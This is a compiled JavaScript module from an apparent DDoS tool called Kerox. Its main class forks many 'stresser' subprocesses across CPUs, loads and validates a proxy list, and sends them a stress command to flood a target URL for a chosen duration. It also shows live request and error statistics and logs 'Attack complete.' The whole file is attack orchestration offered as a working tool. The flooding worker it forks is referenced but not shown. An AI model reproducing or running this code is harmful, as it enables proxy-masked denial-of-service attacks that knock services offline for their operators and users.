"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Kerox = void 0;
const child_process_1 = require("child_process");
const path_1 = __importDefault(require("path"));
const http = __importStar(require("http"));
require("overpaint.js");
const Utils_1 = require("../utils/Utils");
const PacketType_1 = require("../enums/PacketType");
const Status_1 = require("../enums/Status");
const Status_2 = require("../enums/Status");
const Packet_1 = require("../types/Packet");
const Stats_1 = require("./Stats");
const DDoS_1 = require("../types/DDoS");
const LogType_1 = require("../enums/LogType");
const LogManager_1 = require("./LogManager");
const ProgressBar_1 = require("./ProgressBar");
class Kerox {
    // ===== Static =====
    static header = (0, Utils_1.getStatic)('header.txt')._RebeccaPurple;
    // ===== Status =====
    status = Status_1.Status.Unknown;
    info = Status_2.Info.Unknown;
    set _status(value) {
        this.status = value[0] ?? Status_1.Status.Unknown;
        this.info = value[1] ?? Status_2.Info.Unknown;
    }
    // ===== Logs =====
    logs = new LogManager_1.LogManager();
    // ===== Stressers =====
    stressers = new Map();
    stresserStats = new Map();
    // ===== Proxies =====
    proxies = [];
    // ===== Agents =====
    httpAgents = [];
    // ===== Statistics =====
    stats = new Stats_1.Stats();
    progressBar = new ProgressBar_1.ProgressBar(26);
    // ===== Options =====
    ddosStartTime;
    ddosOptions;
    options = {
        refreshRate: 5,
        useProxies: false,
        validateProxies: true,
        updatesPerSecond: 2,
    };
    // ===== Constructor =====
    constructor(options) {
        if (typeof options === 'object') {
            Object.assign(this.options, options);
        }
        this.renderTerminal(this.options.refreshRate);
        this.initialize();
    }
    // ========== Initialization =====================================================================
    initialize() {
        this.stats.disable();
        this.useLocalProxies();
        if (this.options.validateProxies)
            this.validateProxies(5000);
    }
    resetStats() {
        this.stats.reset();
        this.stresserStats.clear();
    }
    stopStressers() {
        this.stressers.forEach(stresser => stresser.kill());
        this.stressers.clear();
        delete this.ddosOptions;
    }
    // ========== Stats ================================================================================
    updateStats() {
        if (this.stats._disabled)
            return;
        this.stats.requests = 0;
        this.stats.pending = 0;
        this.stats.success = 0;
        this.stats.errors = 0;
        this.stresserStats.forEach(stats => {
            this.stats.requests += stats.requests;
            this.stats.pending += stats.pending;
            this.stats.success += stats.success;
            this.stats.errors += stats.errors;
        });
        if (this.ddosOptions)
            this.progressBar.update(this.stats.age / 1000 / this.ddosOptions.duration);
    }
    // ========== Rendering | Logs =====================================================================
    renderFrame() {
        this.updateStats();
        this.logs.update();
        console.clear();
        console.log(Kerox.header);
        console.log();
        if (!this.stats._disabled) {
            console.log(this.createStatsText(this.stats), '\n');
            console.log(this.progressBar.bar);
        }
        this.logs.print(LogType_1.LogType.Stats);
        console.log();
        this.logs.print(LogType_1.LogType.Info);
    }
    renderTerminal(fps = 10) {
        this.renderFrame();
        setInterval(() => this.renderFrame(), 1000 / fps);
    }
    createStatsText(stats) {
        let fields = [
            ['Duration', stats.duration, 'Gray'],
            ['Speed', stats.speed, 'Gray'],
            ['Requests', stats.requests, 'White'],
            ['Pending', stats.pending, 'OrangeGold'],
            ['Success', stats.success, 'GreenApple'],
            ['Errors', stats.errors, 'Red'],
        ];
        let text = '';
        for (let [label, data, ...styles] of fields) {
            let line = `${label}:`.padEnd(11) + `${data}`.padStart(15);
            for (let style of styles)
                line = line[`_${style}`];
            text += line + '\n';
        }
        return text.trimEnd();
    }
    // ========== Proxies ===============================================================================
    /**
     * Reads the proxies from the file and saves them to the proxies array.
     */
    useLocalProxies() {
        let rawProxies = (0, Utils_1.getStatic)('proxies.txt').split('\n');
        this.proxies = (0, Utils_1.parseProxies)(rawProxies);
    }
    /**
     * Starts a stresser to validate the proxies and keep only the working ones.
     */
    validateProxies(timeout = 5000) {
        if (!this.options.useProxies)
            return void this.logs._info('Skipping proxy validation.'._dim);
        // set status
        this._status = [Status_1.Status.Busy, Status_2.Info.ValidatingProxies];
        this.resetStats();
        // validate proxies
        let validator = this.spawn({
            updatesPerSecond: 1,
            target: 'https://example.com',
            useProxies: true,
            proxies: this.proxies,
            threads: 10000,
        });
        // listen for validation completion
        validator?.on('message', (packet) => {
            if (packet.type === PacketType_1.PacketType.Done) {
                let rawProxies = (0, Utils_1.getStatic)('valid_proxies.txt').split('\n');
                let validProxies = (0, Utils_1.parseProxies)(rawProxies);
                this.logs._info(`Found ${validProxies.length} valid proxies`);
                if (validProxies.length > 0) {
                    this.proxies = validProxies;
                }
                else {
                    this.logs._info('Stopping Kerox...'._Red._bold);
                    setTimeout(process.exit, 1000);
                }
                this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
            }
        });
        // start proxy validation
        let packet = (0, Packet_1.Packet)(PacketType_1.PacketType.ValidateProxies, {
            proxies: this.proxies,
            timeout: timeout
        });
        validator.send(packet);
    }
    // ========== Stressers =============================================================================
    /**
     * Starts a stresser sub-process.
     * @param options Configuration options for the stresser
     */
    spawn(options) {
        const stresser = (0, child_process_1.fork)(path_1.default.join(__dirname, '..', 'exec', 'Spawn.js'), []);
        this.stressers.set(stresser.pid, stresser);
        stresser.on('message', (packet) => {
            if (typeof packet !== 'object')
                return;
            switch (packet.type) {
                case PacketType_1.PacketType.Spawned:
                    this.logs._info(`Spawned Kerox (pid: ${stresser.pid})`._GreenApple._dim);
                    break;
                case PacketType_1.PacketType.Done:
                    this.kill(stresser.pid, false);
                    break;
                case PacketType_1.PacketType.Data:
                    this.stresserStats.set(stresser.pid, packet.data);
                    break;
                case PacketType_1.PacketType.Log:
                    this.logs.push(packet.data);
                    break;
            }
        });
        stresser.on('error', (error) => {
            console.log(error);
        });
        stresser.send((0, Packet_1.Packet)(PacketType_1.PacketType.Init, {
            ...this.options,
            ...options
        }));
        return stresser;
    }
    /**
     * Kills a stresser sub-process.
     * @param pid The process id of the stresser to kill
     */
    kill(pid, deleteStats) {
        const stresser = this.stressers.get(pid);
        if (!stresser)
            return;
        stresser.kill();
        this.stressers.delete(stresser.pid);
        if (deleteStats)
            this.stresserStats.delete(stresser.pid);
        this.logs._info(`Killed Kerox (pid: ${stresser.pid})`._Red._dim);
    }
    // ========== DDoS ==================================================================================
    /**
     * Starts stressing a target url with a single stresser
     * @param target The target url
     */
    ddos(options) {
        if (!(0, DDoS_1.isDDoSDuration)(options.duration))
            return void this.logs._info(`Invalid duration.`._Red);
        if (this.status === Status_1.Status.Busy)
            return void this.logs._info(`Kerox is ${this.status}. ${this.info}`._Red);
        this._status = [Status_1.Status.Busy, Status_2.Info.Stressing];
        this.stopStressers();
        this.ddosOptions = options;
        const onSpawned = () => {
            this.resetStats();
            this.stressers.forEach(stresser => stresser.send((0, Packet_1.Packet)(PacketType_1.PacketType.Stress, options.duration)));
        };
        const onCompleted = () => {
            this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
            this.logs._info('Attack complete.'._GreenApple._bold);
            this.logs._stats(this.createStatsText(this.stats));
            this.stopStressers();
            this.stats.disable();
        };
        // spawn stressers
        let agent = options.agent ? new http.Agent(options.agent) : undefined;
        let spawned = 0;
        let completed = 0;
        for (let i = 0; i < options.CPUs; i++) {
            const stresser = this.spawn({
                target: options.target,
                useProxies: this.options.useProxies,
                proxies: this.proxies,
                threads: Math.floor(options.threads / options.CPUs),
                httpAgent: agent,
            });
            // wait for completed
            stresser.on('message', (packet) => {
                switch (packet.type) {
                    case PacketType_1.PacketType.Spawned:
                        spawned++;
                        if (spawned === options.CPUs)
                            onSpawned();
                        break;
                    case PacketType_1.PacketType.Done:
                        completed++;
                        if (completed === options.CPUs)
                            onCompleted();
                        break;
                }
            });
        }
    }
}
exports.Kerox = Kerox;
//# sourceMappingURL=Kerox.js.map